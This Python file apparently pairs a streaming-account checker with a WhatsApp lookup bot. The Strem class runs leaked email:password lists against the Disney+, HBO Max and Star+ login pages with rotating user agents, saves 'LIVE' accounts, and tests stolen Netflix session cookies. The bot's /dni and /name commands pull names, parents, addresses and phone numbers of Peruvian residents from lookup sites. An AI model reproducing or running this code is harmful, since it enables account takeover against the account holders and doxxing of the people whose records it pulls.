from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
from root import WHATS,MODEL,USER
from colorama import Fore 
from lxml import html
import pandas as pd
import time as tmp
import datetime
import requests
import random
import serial
import ast
import re
import os

class Strem:
    def __init__(self):
        #=-----------*=> Variables de Disney <=*------------------#
        self.url_disney_login = 'https://www.disneyplus.com/login'
        self.email = "email"
        self.password = 'password'
        self.button_email = "//form[@id='loginEmail']/div[2]"
        self.button_password = 'password-continue-login'
        self.response_password = '//form/div[1]/span/p/text()'
        self.response_pin = '//form/p[1]/text()' 
        self.error_14 = '//div[@id="password__error"]/text()'
        #=-----------------------*=>@<=*-------------------------#
        
        #=-----------*=> Variables de HBO <=*------------------#
        self.url_hbo_login = "https://play.hbomax.com/signIn"
        self.email_hbo = "EmailTextInput"
        self.password_hbo = "PasswordTextInput"

        #=-----------*=> Variables de start+ <=*------------------#
        self.url_startplus_login = 'https://www.starplus.com/es-419/login'
        self.email_startplus = 'email'
        self.button_startplus = '/html/body/div/div/div[4]/div/main/div/form/div[2]/button'

        self.pin = '/html/body/div/div/div[4]/div/main/div/div/form/p[1]'
        self.password_s = '//*[@id="password__error"]'

        self.password_startplus = 'password'


    def Agent(self):
        user_agent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184"]
        agente = random.choice(user_agent)
        return agente
        
    def Disney(self,file): 
        with open(f'{file}.txt','r') as file:
            lines = file.readlines()
            options = Options()
            for line in lines:
                Email,Password = (line.strip().split(':'))
                options.set_preference("general.useragent.override",self.Agent())
                options.add_argument('--headless')
                driver = webdriver.Firefox(options=options)
                driver.get(self.url_disney_login)
                driver.refresh()
                time = WebDriverWait(driver, 60)
                try:
                    email = time.until(EC.presence_of_element_located((By.ID,self.email)))
                    email.send_keys(Email)
                    button_email = driver.find_element(By.XPATH,self.button_email)
                    button_email.click()
                    tmp.sleep(6)
                    code = html.fromstring(driver.page_source)
                    try:
                        code_text_password = code.xpath(self.response_password)[0]
                        password = time.until(EC.presence_of_element_located((By.ID,self.password)))
                        password.send_keys(Password)
                        button_password = driver.find_element(By.ID,self.button_password)
                        button_password.click()
                        try:
                            tmp.sleep(6)
                            code = html.fromstring(driver.page_source)
                            error_14 = code.xpath(self.error_14)[0]
                            resp = 'Require Password'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                            driver.quit()
                        except:
                            resp = 'LIVE'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.GREEN+resp}')
                            with open('disney.txt','+a') as disney:
                                disney.write(Email+':'+Password+'\n')
                            driver.quit()
                    except TimeoutException:
                        resp = 'account not register or subcription vecind'
                        print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                        driver.quit()
                    except:
                        code_text_pin = code.xpath(self.response_pin)[0]
                        resp = 'Require Pin'
                        print(Fore.YELLOW+F'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                        driver.quit()
                except TimeoutException:
                    driver.refresh()  

    def Hbo(self,file):
        with open(f'{file}.txt','r') as file:
            lines = file.readlines()
            options = Options()
            for line in lines:
                try:
                    Email,Password = (line.strip().split(':'))
                    options.set_preference("general.useragent.override",self.Agent())
                    driver = webdriver.Firefox(options=options)
                    driver.get(self.url_hbo_login)
                    driver.refresh()
                    time = WebDriverWait(driver, 40)
                    tmp.sleep(7)
                    try:
                        email = time.until(EC.presence_of_element_located((By.ID,self.email_hbo)))
                        email.send_keys(Email)
                        password = driver.find_element(By.ID,self.password_hbo)
                        password.send_keys(Password)
                        login = time.until(EC.presence_of_element_located((By.CSS_SELECTOR,'div.r-3691iy')))
                        login.click()
                        tmp.sleep(6)
                        code = html.fromstring(driver.page_source)
                        try:
                            adverten = code.xpath('//span[@class="css-1qaijid"]/text()')[0]
                            resp = 'DEAD'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.RED+resp}')
                            driver.quit()
                        except:
                            resp = 'LIVE'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.GREEN+resp}')
                            with open('hbo.txt','+a')as hbo:
                                hbo.write(Email+':'+password+'\n')
                            driver.quit()
                    except:
                        driver.quit()
                except ValueError:
                    pass
                    
    def Netflix(self,file):
        with open(f'{file}.txt', 'r') as file_cookies:#leer_cookies
            read_cookies = file_cookies.read() # leer cookies
            matches = re.findall(r'Cookie: (.+?)\]',read_cookies)
            dominio = "netflix.com"
            driver = webdriver.Firefox()
            if matches:
                  with open(f'{file}.txt','r') as reads_cookies:
                        separacion_fracmentos = [line.strip().split('|') for line in reads_cookies] # cookies    
                        for num in range(len(matches)):#cookie
                            rex = separacion_fracmentos[num][0].replace('Email:','')
                            Email = re.sub(r'\s+','',rex)

                            cookie_string = matches[num] + ']'
                            cookie_dict = ast.literal_eval(cookie_string)[0]
                            name = cookie_dict['name']
                            value = cookie_dict['value']

                            driver.get("https://" + dominio)
                            tmp.sleep(5)
                            driver.delete_all_cookies()

                            cookie = {'name':name,'value':value}
                            driver.add_cookie(cookie)

                            tmp.sleep(5)

                            html_source = driver.page_source
                            parsed_html = html.fromstring(html_source)
                            element = parsed_html.xpath('//ul[@class="choose-profile"]')

                            if element:
                                print(f'{Fore.YELLOW}Cookie Linea {num} {Fore.GREEN}LIVE [✔] {Email}')             
                                driver.refresh()
                                with open('Netflix.txt','+a') as account:
                                    string = '[{"name":"NetflixId","value":"@"'
                                    result_cookie = string.replace('@',f'{value}')
                                    cook = account.write(result_cookie+'\n')

                            else:
                                print(f"{Fore.YELLOW}Cookie Linea {num} {Fore.RED}DEAD [✘] {Email}")
                            tmp.sleep(3)
                            driver.refresh()
                            tmp.sleep(2)
            else:
                print("No se encontró ninguna cadena con el formato adecuado.")

    def Start_Plus(self,file):
        with open(f'{file}.txt','r') as file:
            lines = file.readlines()
            options = Options()
            for line in lines:
                Email,Password = (line.strip().split(':'))
                options.set_preference("general.useragent.override",self.Agent())
                # options.add_argument('--headless')
                driver = webdriver.Firefox(options=options)
                driver.get(self.url_startplus_login)
                driver.refresh()

                time = WebDriverWait(driver, 60)
                tmp = WebDriverWait(driver, 10)
                try:
                    email = time.until(EC.presence_of_element_located((By.ID,self.email_startplus)))
                    email.send_keys(Email)

                    button_email = driver.find_element(By.XPATH,self.button_startplus)
                    button_email.click()
                    
                    try:
                        password = tmp.until(EC.presence_of_element_located((By.ID,self.password_startplus)))
                        password.send_keys(Password)
                        print('email: '+Email,'password: '+Password)
                        driver.quit()

                    except TimeoutException:
                        print('email: '+Email,'password: '+Password,'registro por primera vez')
                        driver.quit()

                except TimeoutException:
                    driver.quit()
        pass

class cmd:
    def __init__(self):
        pass

    def seeker(self,DNI):
        #http://198.100.155.3/seek/index.php?view=mostrar&cod=73617352'
        web = 'http://158.69.119.209/seek/index.php?view=mostrar&cod='
        url = web+DNI
        site = requests.get(url)

        code = html.fromstring(site.content)

        NOMBRE_APELLIDO = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[1]/div[1]/h2/text()')
        SEPARACION = NOMBRE_APELLIDO[0].split()
        APELLDOS = ' '.join(SEPARACION[-2:])

        NOMBRE_APELLIDO[0] = ' '.join(SEPARACION[:-2])
        NOMBRE = NOMBRE_APELLIDO[0]

        SEXO = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[2]/p[3]/text()')[0]
        EDAD = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[2]/p[2]/text()')[0]
        FECHA = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[2]/p[1]/text()')[1]

        UBIGEO_NACIMIENTO = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[3]/p[3]/text()')[0]
        ESTADO = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[2]/p[4]/text()')[0]

        PADRE = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[2]/p[5]/text()')[0]
        MADRE = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[2]/p[6]/text()')[0]
        DIRECCION = code.xpath('/html/body/div[2]/div[1]/div/div[1]/div[2]/div[3]/p[2]/text()')[0]

        NUMERO = code.xpath('/html/body/div[2]/div[4]/div/div[2]/div[3]/table/tbody/tr/td/text()')

        df = pd.DataFrame([NUMERO[i:i+3] for i in range(0, len(NUMERO), 3)], columns=['Teléfono', 'Operador', 'Periodo'])

        datos = f'''
        • DOCUMENTO: {DNI}
        • NOMBRE: {NOMBRE}
        • APELLIDOS: {APELLDOS}
        • GENERO: {SEXO}

        [✅] NACIMIENTO:

        • FECHA: {FECHA}
        • EDAD: {EDAD}
        • UBIGEO NACIMIENTO: {UBIGEO_NACIMIENTO}

        [✅] PADRES:

        • PADRE: {PADRE}
        • MADRE: {MADRE}

        [✅] GENERALES:

        • ESTADO CIVIL: {ESTADO}
        • DIRECCION: {DIRECCION}

                NUMEROS
        {df.to_string(index=False)}
        '''

        return datos

    def Buscar_DNI_por_Nombres(self,NAME):
        # profile_path = r'C:\Users\upset\AppData\Roaming\Mozilla\Firefox\Profiles\0vwq2jcr.default-release-1'
        WEB = 'https://eldni.com/pe/buscar-por-nombres'
        # busqueda = 'elvia vasquez mendoza'
        busqueda = NAME
        partes = busqueda.split()
        n,m,p = partes[:-2],partes[-1],partes[-2]  

        options = Options()
        # options.add_argument("-profile")
        # options.add_argument(profile_path)
        options.add_argument('--headless')
        driver = webdriver.Firefox(options=options)
        driver.get(WEB)

        time = WebDriverWait(driver,10)
        NOMBRES = time.until(EC.presence_of_element_located((By.XPATH,'//*[@id="nombres"]')))
        for i in range(len(n)):
            NOMBRES.send_keys(n[i]+' ')

        APELLIDO_P = time.until(EC.presence_of_element_located((By.XPATH,'//*[@id="apellido_p"]')))
        APELLIDO_P.send_keys(p)

        APELLIDO_M = time.until(EC.presence_of_element_located((By.XPATH,'//*[@id="apellido_m"]')))
        APELLIDO_M.send_keys(m)
        
        Search = time.until(EC.presence_of_element_located((By.XPATH,'//*[@id="btn-buscar-por-nombres"]')))
        Search.click()
        
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        rows = soup.find_all('tr')
        data = []
        for row in rows[1:]:
            cols = row.find_all(['th', 'td'])
            cols = [col.get_text(strip=True) for col in cols]
            data.append(cols)
        df = pd.DataFrame(data)
        try:
            df.columns = ['DNI', 'NOMBRES', 'APELLIDO_P', 'APELLIDO_M']
            return df.to_string(index=False)
        except:
            return '⚠️ no se encotraon resultados'

    def strem(self,file):
        file_info = os.stat(f'C:\\Users\\upset\\Documents\\programacion\\entornos python\\whastapp\\{file}.txt')
        creation_time = file_info.st_ctime
        creation_date = datetime.datetime.fromtimestamp(creation_time).date()
        with open('account.txt','r') as tmp:
            read_accounts = tmp.read().splitlines()
            note = 'Cuentas no actualizada desde'
            rand_account = random.choice(read_accounts)
            return f'{note} {creation_date} \n {rand_account}'

    def home(self,status):
        ser = serial.Serial('COM9', 9600, timeout=1)
        try:
            com = status.strip()
            while True:
                # comando = input("Ingrese 'on' para encender el LED o 'off' para apagarlo: ")
                comando = com
                print(comando)
                if comando == 'on':
                    ser.write(b'0')  # Envia el comando '1' al Arduino
                    # print("LED encendido")
                    break
                elif comando == 'off':
                    ser.write(b'1')  # Envia el comando '0' al Arduino
                    # print("LED apagado")
                    # break
                else:
                    print("Comando no válido")

        except KeyboardInterrupt:
            ser.close()
            print("Conexión serial cerrada")
        
class whats(cmd):
    def __init__(self):
        pass
        # super().__init__()
        # self.D = None
        # self.H = None

    def send(self,x,iniciar):
        name = list(x)
        for x in name:
            iniciar.send_keys(x)
        iniciar.send_keys(Keys.RETURN)

    def update_msg(self,driver):
        tmp.sleep(2)
        code = html.fromstring(driver.page_source)
        xpath_elements_div = code.xpath(WHATS().FRAGMENT)
        count_elements_div = len(xpath_elements_div)
        return count_elements_div

    def server(self,driver,Msg,identify,user_search):
        tim = WebDriverWait(driver,10)
        #>>>>>>>>----------[BUSCA EL ULTMIMO MENSAJE ENVIADO WHATSAPP]--------------------------<<<<<<<<
        Xpath_Msg = identify
        Search_Msg = tim.until(EC.presence_of_element_located((By.XPATH,Xpath_Msg)))
        Search_Ms = Search_Msg.text
        #>>>>>>>>----------======================================================----------------<<<<<<<<
        
        #>>>>>>>>----------[SECCION DE BUSQUEDA DE MI NOMBRE DE USUARIO DE WHATSAPP]-------------<<<<<<<<
        users = user_search
        Search_M = tim.until(EC.presence_of_element_located((By.XPATH,users)))
        mio = Search_M.get_attribute("data-pre-plain-text")
        #>>>>>>>>----------======================================================----------------<<<<<<<<

        #>>>>>>>>-------[ELIMINA ELEMENTOS INCESARIO DE LA LISTA DE NOMBRE DE USUARIO]------------<<<<<<<
        patron = r'\[(.*?)\] (.*)'
        Expresion = re.search(patron,mio)
        user = Expresion.group(2) 
        #>>>>>>>>----------======================================================----------------<<<<<<<<
        value_cmd = Search_Ms[5:]
        #>>>>>>>>----------[COMANDO ADMITIDOS]----------------<<<<<<<<
        if Search_Ms.startswith("/dni"):
            if len(value_cmd) == 8:
                dako = self.seeker(value_cmd)
                self.send(dako,Msg)
                print(user+' '+value_cmd)
            else:
                self.send('⚠️ el comando no contiene 8 digitos',Msg)

        elif Search_Ms.startswith("/name"):
            if value_cmd:
                nombre_P_M = self.Buscar_DNI_por_Nombres(value_cmd)
                self.send(nombre_P_M,Msg)
                print(user+' '+value_cmd)

        elif Search_Ms.startswith("/disney"):
            pass
            # account = self.strem(self.D)
            # self.send(account,Msg)
            # print(user+' '+account)

        elif Search_Ms.startswith("/hbo"):
            pass
            # account = self.strem(self.H)
            # self.send(account,Msg)
            # print(user+' '+account)

        elif Search_Ms.startswith("/home"):
            account = self.home(value_cmd)
            # self.send(account,Msg)
            print(user+value_cmd)

        else:
            pass

    def main(self,ID):
        profile_path = r'C:\Users\upset\AppData\Roaming\Mozilla\Firefox\Profiles\2pfqmsrv.base'
        options=Options()
        
        options.add_argument("-profile")
        options.add_argument(profile_path)

        driver = webdriver.Firefox(options=options)

        driver.get('https://web.whatsapp.com/')
        time = WebDriverWait(driver,60)

        try:
            iniciar = time.until(EC.presence_of_element_located((By.XPATH,WHATS().SEARCH)))
            iniciar.click()
            self.send(ID,iniciar)

            Msg = time.until(EC.presence_of_element_located((By.XPATH,WHATS().BOX_MSG)))
            Msg.click()

            # self.send(WHATS().BANNER,Msg)

            while True:
                count_elements_div = self.update_msg(driver)
                try:
                    self.server(driver,Msg,MODEL(count_elements_div).MSG_UPDATE_CLIENT,USER(MODEL(count_elements_div).count).USER_CLIENT)
                except TimeoutException:
                    self.server(driver,Msg,MODEL(count_elements_div).MSG_UPDATE_SERVER,USER(MODEL(count_elements_div).count).USER_SERVER)
                except KeyboardInterrupt:
                    print('cierre de bot')
                    driver.quit()
                    break

        except TimeoutException:
            print('acabo el timpo de espera')
        pass




